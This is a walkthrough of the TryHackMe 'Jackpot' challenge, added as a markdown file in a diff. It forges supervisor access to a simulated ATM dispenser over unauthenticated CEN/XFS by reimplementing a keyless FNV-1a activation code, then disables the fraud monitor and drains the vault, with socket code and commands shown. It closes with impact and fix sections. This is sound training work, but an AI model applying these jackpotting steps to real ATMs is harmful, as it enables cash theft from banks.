@@ -1,0 +1,243 @@
+---
+title: 'Jackpot'
+description: "An ATM's XFS cash-dispenser speaks over a plain TCP port with no transport auth; its only 'lock' is a keyless activation code computed by a public FNV-1a hash shipped in the field binary, so we forge supervisor access, disable the fraud monitor, and empty the vault to release the flag."
+date: 2026-10-10
+platform: tryhackme
+room: 'Jackpot'
+roomUrl: 'https://tryhackme.com/room/jackpot'
+difficulty: medium
+tags:
+  - 'crypto'
+  - 'reverse-engineering'
+  - 'atm'
+  - 'xfs'
+  - 'network-protocol'
+vulnClasses:
+  - 'missing transport authentication'
+  - 'keyless challenge-response'
+  - 'non-cryptographic hash misuse'
+  - 'security through obscurity'
+  - 'disableable fraud controls'
+translation: done
+draft: false
+---
+
+## **TryHackMe: Jackpot — ATM Jackpotting over XFS with a Keyless Activation Code**
+
+_A walkthrough of the "Jackpot" challenge from TryHackMe. The box models an ATM "black box" attack: a cash-dispenser module speaks the CEN/XFS protocol over a bare TCP port with no authentication or encryption. Its one defence is a 6-digit nonce and an 8-digit supervisor "activation code" — but that code is produced by a public, keyless FNV-1a hash whose implementation ships inside the engineering binary. We recover the algorithm, forge supervisor mode with no card and no PIN, switch off the fraud monitor, and drain the vault to the last note to release the flag._
+
+> The flag is redacted. Jackpot is an authorized training challenge on TryHackMe; everything here was performed against a legal practice target. The flag is shown as `THM{<redacted>}`; the real value was recovered on the box but is withheld here. The FNV constants and the `ENBANK` string are public algorithm details recovered from the field binary, not secrets — they are kept because they are the whole lesson.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Port `9100` is a **CEN/XFS cash-dispenser (CDM) gateway** with **no transport auth** → its banner leaks the wire framing and points at `GETINFO 0x304`, which dumps the full **command table** (`STATUS`, `DISPENSE`, `ARM`, `SET_MONITOR`, `GET_FLAG`) → `GETINFO 0x301` returns the machine **state** including a per-session **nonce** and `flag_released:false` → the supervisor **activation code** is `f(nonce)` with **no secret key** — a public **FNV-1a** variant whose exact code ships in the `jackpot` field binary, so we compute valid codes **offline** → **ARM** (`EXECUTE 0x4f0`) with the code as **raw ASCII, not JSON** flips `armed:true` (supervisor mode) → **SET_MONITOR off** (`0x4f1`, must ARM first) kills the fraud monitor → **DISPENSE** (`0x401`) until `remaining_notes == 0` — a full cashout is the "proof" that sets `flag_released:true` → **GET_FLAG** (`0x4ff`) returns `THM{<redacted>}`.
+
+No card, no PIN — just the wrong voice speaking XFS.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+```
+
+The scan shows an SSH port and two unusual services — a Python web console and a raw "jetdirect" port:
+
+```text
+nmap -sS -p- -T4 --min-rate=1000 $IP
+# 22/tcp   open  ssh
+# 8080/tcp open  http-proxy
+# 9100/tcp open  jetdirect
+
+nmap -sC -sV -p 8080,9100 $IP
+# 8080/tcp open  http  BaseHTTPServer 0.6 (Python 3.12.3)
+#   http-title: Earth's National Bank — Terminal 004 Engineering Console
+# 9100/tcp open  jetdirect?
+```
+
+The web console on `8080` is an "engineering" page that hands out a field tool — the `jackpot` binary, "Earth's National Bank - Terminal Engineering Tool". Running it turns a 6-digit session nonce into an 8-digit activation code:
+
+```text
+file jackpot
+# jackpot: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped
+
+./jackpot 123456
+# [*] session nonce : 123456
+# [*] activation code: 47384178
+```
+
+Port `9100` is the real target. Connecting to it returns a self-describing banner — a "Branch Engineering Gateway (XFS bridge)" that tells us the wire format outright:
+
+```text
+nc $IP 9100
+# {"service":"Branch Engineering Gateway","protocol":"XFS bridge",
+#  "request_format":"1 byte msg_type + 4 byte big-endian command id + 2 byte big-endian length + <length> bytes of data",
+#  "reply_format":"2 byte big-endian length + <length> bytes of JSON",
+#  "msg_types":{"GETINFO":"0x01","EXECUTE":"0x02"},
+#  "hint":"query command 0x0304 (WFS_INF_CDM_CAPABILITIES) with msg_type GETINFO"}
+```
+
+This is a simulated **CEN/XFS** stack — the same API family (cash dispenser = **CDM**, `WFS_INF_*` = query, `WFS_CMD_*` = execute) that every real ATM speaks between its PC and its dispenser. Talking to it directly, with no card reader or PIN pad in the loop, **is** the classic ATM "black box" attack.
+
+### **The vulnerability — a keyless challenge-response**
+
+The machine gates "supervisor mode" behind a challenge-response: it shows a 6-digit **nonce**, and you must return the matching 8-digit **activation code**. That looks like real authentication — until you ask where the secret is.
+
+<Callout type="insight">
+
+A challenge-response is only safe when `response = f(challenge, secret)` and the **secret** lives server-side (an HMAC key, a signing key). Here the activation code is `f(nonce)` with **no secret at all** — `f` is a public, deterministic **FNV-1a** hash (recognisable from its constants: offset basis `0xcbf29ce484222325`, prime `0x100000001b3`), and its exact implementation ships inside the `jackpot` field binary. Anyone who holds that binary — or reverses it — can compute a valid code for **any** nonce, offline, without ever touching the server. This is **security by obscurity**, a textbook Kerckhoffs violation: there is no key to keep, only an algorithm that was never actually hidden.
+
+</Callout>
+
+The binary is the ground-truth oracle (`./jackpot <nonce>`), but reimplementing `f` lets us automate the whole chain. Two cryptographic sins stack here: a **non-cryptographic hash** (FNV is built for hash tables, not authentication) used as an auth primitive, and that primitive's code distributed to the field.
+
+### **Step 1 — Map the XFS command table (\*\***`GETINFO 0x304`\***\*)**
+
+Following the banner's hint, send a `GETINFO` for command `0x0304` with an empty body. Every request is `[1B msg_type][4B BE command][2B BE length][data]`; every reply is `[2B BE length][JSON]`:
+
+```text
+python3 -I -c '
+import socket,struct,json
+s=socket.create_connection(("'"$IP"'",9100),timeout=5)
+def rx(n):
+    b=b""
+    while len(b)<n: b+=s.recv(n-len(b))
+    return b
+json.loads(rx(struct.unpack(">H",rx(2))[0]))            # swallow banner
+s.sendall(b"\x01"+struct.pack(">I",0x0304)+struct.pack(">H",0))
+print(json.loads(rx(struct.unpack(">H",rx(2))[0])))
+'
+# {'rc':'WFS_SUCCESS','device_class':'CDM',
+#  'commands':{'WFS_INF_CDM_STATUS':'0x301','WFS_INF_CDM_CASH_UNIT_INFO':'0x303',
+#              'WFS_INF_CDM_CAPABILITIES':'0x304','WFS_CMD_CDM_DISPENSE':'0x401',
+#              'WFS_CMD_CDM_ARM':'0x4f0','WFS_CMD_CDM_SET_MONITOR':'0x4f1',
+#              'WFS_CMD_CDM_GET_FLAG':'0x4ff'},'max_dispense':40}
+```
+
+That is the whole attack surface: a status query, a dispense command, an `ARM` (enter supervisor), a `SET_MONITOR` (fraud control), and a `GET_FLAG`.
+
+### **Step 2 — Read machine state and grab a live nonce (\*\***`GETINFO 0x301`\***\*)**
+
+`STATUS` exposes the machine's internal variables — crucially the per-session `nonce` and the `flag_released` flag we ultimately need to flip:
+
+```text
+# same framing, command 0x0301
+# {'rc':'WFS_SUCCESS','status':{'nonce':'215120','armed':False,'monitor_on':True,
+#   'locked':False,'screen':'INSERT CARD','remaining_notes':280,'vault_total_notes':280,
+#   'cassettes':[{denom:10,count:100},{denom:20,count:80},{denom:50,count:60},{denom:100,count:40}],
+#   'flag_released':False}}
+```
+
+The whole challenge reduces to driving `flag_released` from `false` to `true`. The nonce **rotates per session**, so it must be read fresh inside the same connection and fed into the code generator — never hard-coded.
+
+### **Step 3 — Recover the activation-code algorithm (FNV-1a)**
+
+Disassembling the binary's hash function shows standard FNV-1a over the nonce, then a second pass over the literal `ENBANK` with an xorshift mix per character, reduced mod 1e8 and zero-padded to 8 digits. Reimplement it and verify against the binary oracle on known nonces before trusting it:
+
+```text
+def activation_code(nonce: str) -> str:
+    h = 0xcbf29ce484222325                                 # FNV offset basis
+    for c in nonce:                                        # pass 1: FNV-1a over the nonce
+        h = ((h ^ ord(c)) * 0x100000001b3) & 0xFFFFFFFFFFFFFFFF
+    for c in "ENBANK":                                     # pass 2: E,N,B,A,N,K
+        h = ((ord(c) ^ h) * 0x100000001b3) & 0xFFFFFFFFFFFFFFFF
+        h = ((h >> 0x1d) ^ h) & 0xFFFFFFFFFFFFFFFF         # xorshift mix (>>29 ^ h)
+    return f"{h % 100000000:08d}"                          # mod 1e8, zero-padded
+
+# verify against the oracle: ./jackpot <nonce>
+# nonce=215120  mine=86961047  binary=86961047  OK
+# nonce=123456  mine=47384178  binary=47384178  OK
+```
+
+The subtle trap is the second loop: the assembly pre-loads the _first_ character and advances to the _next_ one each iteration, so a hand-port that mixes `E,E,N,B,A,N` (seven values, a repeated `E`) is off by one and produces wrong codes — which is exactly why verifying against the binary on several nonces matters.
+
+### **Step 4 — ARM into supervisor mode (raw DATA, not JSON)**
+
+With the correct code, `ARM` (`EXECUTE 0x4f0`) should unlock supervisor mode — but the obvious JSON payload keeps returning `WFS_ERR_CDM_INVALIDCODE`.
+
+<Callout type="note">
+
+**When a content-correct payload is rejected** **_identically_** **to an empty one, suspect the framing/encoding, not the content.** Sending the code as `{"activation_code":"..."}` fails the same way as sending `{}` — proof the server never parses our JSON. The banner only promised the _reply_ is JSON; the request **DATA is raw bytes**. `ARM` wants the 8 ASCII characters of the code (e.g. `b"86961047"`), `SET_MONITOR` wants `b"off"`, `DISPENSE` wants the note count as ASCII. Re-read the spec; don't assume JSON on both sides.
+
+</Callout>
+
+Send the code as raw ASCII and the machine arms:
+
+```text
+# EXECUTE=0x02, ARM=0x4f0, DATA = raw ASCII code (read a FRESH nonce first)
+s.sendall(b"\x02"+struct.pack(">I",0x04f0)+struct.pack(">H",8)+code.encode())
+# {'rc':'WFS_SUCCESS','detail':'armed - supervisor mode'}  -> status armed=True
+```
+
+### **Step 5 — Disable the fraud monitor (order matters)**
+
+Armed, the first dispense works, but a second trips a fraud monitor (`monitor_on:true`) that locks the machine (`WFS_ERR_CDM_LOCKED`, \~45s) for an "anomalous dispense with null transaction id". We turn it off with `SET_MONITOR`, but only after arming:
+
+```text
+# SET_MONITOR before ARM -> WFS_ERR_CDM_NOTARMED  (a precondition error, not a content error)
+# SET_MONITOR after ARM:
+s.sendall(b"\x02"+struct.pack(">I",0x04f1)+struct.pack(">H",3)+b"off")
+# {'rc':'WFS_SUCCESS','monitor_on':False}
+```
+
+The apparent deadlock (the monitor blocks dispensing, but disabling it needs privilege) isn't one: `ARM` is gated on the _code_, not on the monitor, so the forced order is simply **ARM, then SET_MONITOR off**. The distinct error codes (`NOTARMED` ≠ `INVALIDCODE`) are what reveal the dependency. Once in supervisor mode, the attacker switches off the very control meant to catch them.
+
+### **Step 6 — Empty the vault to release the flag**
+
+`GET_FLAG` keeps returning "no proof of cashout on record" even after successful dispenses, because our dispenses carry a null transaction id and no single one counts as proof. The DATA for `DISPENSE` is just the note count, and there is no way to supply a transaction id — so the intended proof is a _real_ jackpot: drain the vault completely.
+
+<Callout type="note">
+
+The flag condition is not "one valid transaction" but **`dispensed_total == vault_total_notes`** — the machine must spit out _every_ note. With the fraud monitor off, nothing stops a loop of `DISPENSE 40` until `remaining_notes` hits `0`; at that moment `flag_released` flips to `true`. That is the literal definition of _jackpotting_: the ATM empties itself.
+
+</Callout>
+
+```text
+# loop: read STATUS.remaining_notes, DISPENSE min(remaining,40) as ASCII, until 0
+#   DISPENSE 40 notes ... remaining 240 ... 200 ... -> 0
+# status: dispensed_total=280  flag_released=True  screen='SUPERVISOR MODE'
+
+# EXECUTE 0x4ff GET_FLAG
+# {'rc':'WFS_SUCCESS','flag':'THM{<redacted>}'}
+```
+
+Banner → command table → live nonce → forged code → ARM (raw) → monitor off → full cashout → flag. Every step reads a state variable and flips exactly the one it needs.
+
+### **Impact**
+
+<Callout type="critical">
+
+**Critical — unauthenticated cash-out of the dispenser.** A representative score is **CVSS 3.1 9.3** (`AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`): anyone who can reach the dispenser's control channel (an ATM "black box" wiretap) can mint supervisor access and empty the vault, with no card, PIN, or valid transaction. The failures mirror real-world jackpotting (Ploutus, Cutlet Maker):
+
+- **No transport authentication or encryption** on the CDM control channel — the XFS trust model assumes every caller is trusted internal software.
+- **A keyless challenge-response** — the "activation code" is a pure function of the nonce with no server-side secret, so it authenticates nothing.
+- **A non-cryptographic hash (FNV-1a) used for authentication**, with its implementation shipped in a field binary — security by obscurity that was never obscure.
+- **An attacker-disableable fraud monitor** — the anti-fraud control can be switched off by the same supervisor session it is meant to police.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Authenticate and encrypt the control channel.** Move off legacy XFS to an authenticated transport (e.g. XFS4IoT over TLS/WebSocket), mutually authenticate the host and the dispenser, and physically/logically isolate the PC-to-CDM link so a black box cannot speak to it.
+2. **Use a keyed challenge-response.** Compute the supervisor response as an HMAC or digital signature over the nonce, with the key held in an HSM/secure element — never a bare hash, and never a key or algorithm that ships in a field tool.
+3. **Never use a non-cryptographic hash for authentication.** FNV/CRC and friends are for hash tables and checksums; authentication needs a keyed MAC or signature.
+4. **Make fraud controls tamper-evident and independent.** Monitoring and journaling must be append-only, externally reported, and not disableable from the operator/supervisor session they oversee.
+
+</Callout>
+
+### **Takeaways**
+
+- **A challenge-response with no secret is theatre.** If the response is a pure function of the challenge, and that function is public (or ships in a binary), there is nothing to authenticate — Kerckhoffs again.
+- **Read the protocol the service hands you.** The banner gave the framing and the first command; the win was in parsing it carefully, not in blasting payloads.
+- **Identical failures point at format, not content.** A correct code rejected exactly like an empty body meant the server ignored our JSON — the DATA was raw bytes all along.
+- **Verify a reversed algorithm against an oracle.** The `ENBANK` loop's off-by-one only shows up when you check your implementation against the real binary on several nonces.
+- **Anti-fraud you can switch off isn't anti-fraud.** Controls an attacker can disable after gaining privilege buy nothing; monitoring has to be independent and tamper-evident.
+
+Thanks for reading. Jackpot is a tidy model of real ATM black-box attacks: strip away the card and the PIN and you're left with a chatty XFS dispenser whose only lock is a keyless hash — recover the algorithm, speak the protocol, and the vault empties itself.
